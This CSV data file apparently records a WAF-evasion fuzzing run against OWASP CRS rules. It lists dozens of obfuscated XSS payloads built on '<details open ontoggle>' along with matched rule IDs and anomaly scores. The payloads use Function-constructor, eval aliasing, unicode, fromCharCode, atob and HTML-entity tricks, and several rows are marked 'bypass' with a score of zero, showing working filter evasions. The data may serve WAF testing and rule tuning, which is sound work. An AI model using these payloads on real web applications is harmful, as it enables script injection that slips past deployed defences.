index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
426,"<details open ontoggle=""(function(){with(this){top['e'+'val']('al'+'ert(1)')}})()"">",0,1,block,8,"932105,933210,934100,934100,941100,941120,941370,949110","o46,4v217,83 || o24,57v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,83 || o25,11v217,83t:urlDecodeUni || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,20v217,83t:urlDecodeUni,t:compressWhitespace || ",35,177826458685.863338
427,"<details open ontoggle=""(function(){with(this){self['ev\x61l']('al'+'ert(1)')}})()"">",0,1,block,6,"934100,934100,941100,941120,941370,949110","o25,11v217,84 || o25,11v217,84t:urlDecodeUni || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,21v217,84t:urlDecodeUni,t:compressWhitespace || ",25,177826458863.211333
428,"<details open ontoggle=""(function(){with(this){parent[String.fromCharCode(101,118,97,108)]('al'+'ert(1)')}})()"">",0,1,block,6,"934100,934100,941100,941120,941370,949110","o25,11v217,112 || o25,11v217,112t:urlDecodeUni || v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,49v217,112t:urlDecodeUni,t:compressWhitespace || ",25,177826459087.080147
429,"<details open ontoggle=""(function(){with(this){globalThis['e'+'val']('al'+'ert(1)')}})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,64v217,90t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,90 || o25,11v217,90t:urlDecodeUni || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,27v217,90t:urlDecodeUni,t:compressWhitespace || ",30,177826459288.901010
430,"<details open ontoggle=""(function(){with(this){Function('al'+'ert(1)')()}})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,53v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,79 || o25,11v217,79t:urlDecodeUni || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826459489.059195
431,"<details open ontoggle=""(function(){with(this){[]['constructor']['constructor']('al'+'ert(1)')()}})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,77v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,103 || o25,11v217,103t:urlDecodeUni || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,8v217,103t:urlDecodeUni,t:compressWhitespace || ",30,177826459677.752703
432,"<details open ontoggle=""(function(){with(this){('')['constructor']['constructor']('al'+'ert(1)')()}})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,79v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,105 || o25,11v217,105t:urlDecodeUni || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,25v217,105t:urlDecodeUni,t:compressWhitespace || ",30,177826459823.278147
433,"<details open ontoggle=""(function(){with(this){(1)['constructor']['constructor']('al'+'ert(1)')()}})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,78v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,104 || o25,11v217,104t:urlDecodeUni || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,24v217,104t:urlDecodeUni,t:compressWhitespace || ",30,177826460151.045079
434,"<details open ontoggle=""(function(){with(this){window['\u0065val']('al'+'ert(1)')}})()"">",0,1,block,6,"934100,934100,941100,941120,941370,949110","o25,11v217,88 || o25,11v217,88t:urlDecodeUni || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,25v217,88t:urlDecodeUni,t:compressWhitespace || ",25,177826460391.032399
435,"<details open ontoggle=""(function(){with(this){this['e\u0076al']('al'+'ert(1)')}})()"">",0,1,block,6,"934100,934100,941100,941120,941370,949110","o25,11v217,86 || o25,11v217,86t:urlDecodeUni || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,23v217,86t:urlDecodeUni,t:compressWhitespace || ",25,177826460525.878498
436,"<details open ontoggle=""(function(){with(this){Reflect.get(window,'e'+'val')('al'+'ert(1)')}})()"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,11v217,98 || o25,11v217,98t:urlDecodeUni || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826460744.990847
437,"<details open ontoggle=""(function(){with(this){({}).constructor.constructor('al'+'ert(1)')()}})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,73v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,99 || o25,11v217,99t:urlDecodeUni || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826460924.994567
439,"<details open ontoggle=""(function(){with(this){window['e\u0076\u0061l']('al'+'ert(1)')}})()"">",0,1,block,6,"934100,934100,941100,941120,941370,949110","o25,11v217,93 || o25,11v217,93t:urlDecodeUni || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,30v217,93t:urlDecodeUni,t:compressWhitespace || ",25,177826461366.065432
440,"<details open ontoggle=""(function(){with(this){setTimeout['constructor']('al'+'ert(1)')()}})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,70v217,96t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,96 || o25,11v217,96t:urlDecodeUni || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,31v217,96t:urlDecodeUni,t:compressWhitespace || ",30,177826461517.755061
441,"<details open ontoggle=""(function(){with(this){isNaN['constructor']('al'+'ert(1)')()}})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,65v217,91t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,91 || o25,11v217,91t:urlDecodeUni || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,26v217,91t:urlDecodeUni,t:compressWhitespace || ",30,177826461751.530054
462,"<details open ontoggle=""(new(self.Function)('ale'+'rt(2)'))()"">",0,1,block,4,"933210,941100,941120,949110","o24,37v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826466238.320243
463,"<details open ontoggle=""(new(top.Function)('al'+'ert(2)'))()"">",0,1,block,4,"933210,941100,941120,949110","o24,36v217,62t:urlDecode,t:replaceComments,t:compressWhitespace || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826466479.552790
464,"<details open ontoggle=""(new(parent.Function)('aler'+'t(2)'))()"">",0,1,block,4,"933210,941100,941120,949110","o24,39v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826466613.836537
465,"<details open ontoggle=""(new(window.Function)('ale'+'rt(2)'))()"">",0,1,block,4,"933210,941100,941120,949110","o24,39v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826466834.395585
467,"<details open ontoggle=""(new(this.constructor.constructor)('ale'+'rt(2)'))()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,52v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o29,16v217,78 || o29,16v217,78t:urlDecodeUni || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826467296.359235
468,"<details open ontoggle=""(new({}.constructor.constructor)('ale'+'rt(2)'))()"">",0,1,block,4,"933210,941100,941120,949110","o24,50v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826467592.226531
469,"<details open ontoggle=""(new([].constructor.constructor)('ale'+'rt(2)'))()"">",0,1,block,4,"933210,941100,941120,949110","o24,50v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826467778.206507
470,"<details open ontoggle=""(new(1..constructor.constructor)('ale'+'rt(2)'))()"">",0,1,block,4,"933210,941100,941120,949110","o24,50v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17782646793.634007
478,"<details open ontoggle=""(new&#09;Function&#09;('ale'+'rt(2)'))()"">",0,1,bypass,2,"941100,941120","v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826469592.094047
479,"<details open ontoggle=""(new&#10;Function&#10;('ale'+'rt(2)'))()"">",0,1,bypass,2,"941100,941120","v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826469759.894659
480,"<details open ontoggle=""(new&#13;Function&#13;('ale'+'rt(2)'))()"">",0,1,bypass,2,"941100,941120","v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826469976.031915
481,"<details open ontoggle=""(new&#32;Function&#32;('ale'+'rt(2)'))()"">",0,1,bypass,2,"941100,941120","v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826470297.134520
486,"<details open ontoggle=""[].find['constr'+'uctor']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o24,42v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826471264.788757
491,"<details open ontoggle=""(Reflect['construc'+'t'](function(){}['con'+'structor'],['al'+'ert(1)'])())""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,75v217,111t:urlDecode,t:replaceComments,t:compressWhitespace || o49,11v217,111 || o49,11v217,111t:urlDecodeUni || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826472392.435512
498,"<details open ontoggle=""(async function(){}['constr'+'uctor']('aler'+'t(1)')())""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,55v217,91t:urlDecode,t:replaceComments,t:compressWhitespace || o31,11v217,91 || o31,11v217,91t:urlDecodeUni || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826473840.744328
506,"<details open ontoggle=""top['Function']('return\u0020al'+'ert')()('XSS')""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o27,45v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,84t:urlDecodeUni,t:compressWhitespace || ",20,177826475571.211507
522,"<details open ontoggle=""(new Function('return al'+'ert')).call()(2)"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,43v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,69 || o25,13v217,69t:urlDecodeUni || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826478990.733989
535,"<details open ontoggle=""parent['ev'+'al']('ale'+'rt(2)')"">",0,1,block,4,"933210,941100,941120,949110","o30,26v217,58t:urlDecode,t:replaceComments,t:compressWhitespace || v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826481629.833591
542,"<details open ontoggle=""(Function.constructor('return wind'+'ow.al'+'ert'))()('XSS')"">",0,1,block,4,"933210,941100,941120,949110","o24,60v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826483148.217914
544,"<details open ontoggle=""(window['Function']['constructor']('return wind'+'ow.al'+'ert'))()('XSS')"">",0,1,block,5,"933210,941100,941120,941370,949110","o24,73v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,18v217,99t:urlDecodeUni,t:compressWhitespace || ",20,177826483594.665284
553,"<details open ontoggle=""(top['Function']['constructor']('return wind'+'ow.al'+'ert'))()('XSS')"">",0,1,block,5,"933210,941100,941120,941370,949110","o24,70v217,96t:urlDecode,t:replaceComments,t:compressWhitespace || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,15v217,96t:urlDecodeUni,t:compressWhitespace || ",20,177826485417.456823
555,"<details open ontoggle=""(frames['Function']('return wind'+'ow.al'+'ert'))()('XSS')"">",0,1,block,4,"933210,941100,941120,949110","o24,58v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826485819.934065
559,"<details open ontoggle=""(Function['constructor']('return wind'+'ow.al'+'ert'))()('XSS')"">",0,1,block,4,"933210,941100,941120,949110","o24,63v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826486742.884088
562,"<details open ontoggle=""(Function.prototype.constructor.call(null,atob('YWxlcnQoMSk=')))()"">",0,1,bypass,2,"941100,941120","v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826487331.737140
568,"<details open ontoggle=""(async function(){}.constructor(String.fromCharCode(97,108,101,114,116,40,49,41)))()"">",0,1,block,4,"934100,941100,941120,949110","o31,11v217,110 || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826488645.361299
574,"<details open ontoggle=""(Object.create(Object.getPrototypeOf(function(){})).constructor(String.fromCharCode(97,108,101,114,116,40,49,41)))()"">",0,1,block,4,"934100,941100,941120,949110","o61,11v217,142 || v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826489926.681614
579,"<details open ontoggle=""(Reflect.construct(Function,[String.fromCharCode(97,108,101,114,116,40,49,41)]))()"">",0,1,block,4,"934100,941100,941120,949110","o53,19v217,108 || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17782649094.787943
580,"<details open ontoggle=""(Reflect.apply(Function.prototype.constructor,null,[String.fromCharCode(97,108,101,114,116,40,49,41)]))()"">",0,1,block,4,"934100,941100,941120,949110","o76,19v217,131 || v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826491226.556822
581,"<details open ontoggle=""(Function.prototype.bind.call(Function.prototype.call,Function,null,String.fromCharCode(97,108,101,114,116,40,49,41))())()"">",0,1,block,4,"934100,941100,941120,949110","o92,19v217,148 || v217,148t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,148t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826491460.899634
584,"<details open ontoggle=""[]['constructor']['constructor']('ale'+'rt(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o24,49v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826492083.260040
586,"<details open ontoggle=""top['Function']['call'](null,'ale'+'rt'+String.fromCharCode(40)+'1)')()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o27,68v217,97t:urlDecode,t:replaceComments,t:compressWhitespace || o64,19v217,97 || o64,19v217,97t:urlDecodeUni || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,97t:urlDecodeUni,t:compressWhitespace || ",30,177826492437.695280
587,"<details open ontoggle=""Object['constructor']['constructor']('ale'+'rt(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o30,47v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826492610.340057
592,"<details open ontoggle=""window['Function']['prototype']['constructor']('al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o30,57v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,18v217,89t:urlDecodeUni,t:compressWhitespace || ",20,177826493713.846318
597,"<details open ontoggle=""this['construct'+'or']['construct'+'or']('ale'+'rt(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o28,53v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,22v217,83t:urlDecodeUni,t:compressWhitespace || ",20,177826494840.132736
601,"<details open ontoggle=""(class{static{window['Funct'+'ion']('ale'+'rt(1)')()}})"">",0,1,block,5,"933210,941100,941120,941370,949110","o24,55v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o38,21v217,81t:urlDecodeUni,t:compressWhitespace || ",20,177826495676.133088
604,"<details open ontoggle=""top['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o27,50v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,79t:urlDecodeUni,t:compressWhitespace || ",20,177826496326.934002
608,"<details open ontoggle=""globalThis['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o34,50v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826497194.444959
612,"<details open ontoggle=""Reflect.get(window,'Function')('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,bypass,2,"941100,941120","v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826498034.549350
615,"<details open ontoggle=""with(window)Function('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,bypass,2,"941100,941120","v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826498763.093673
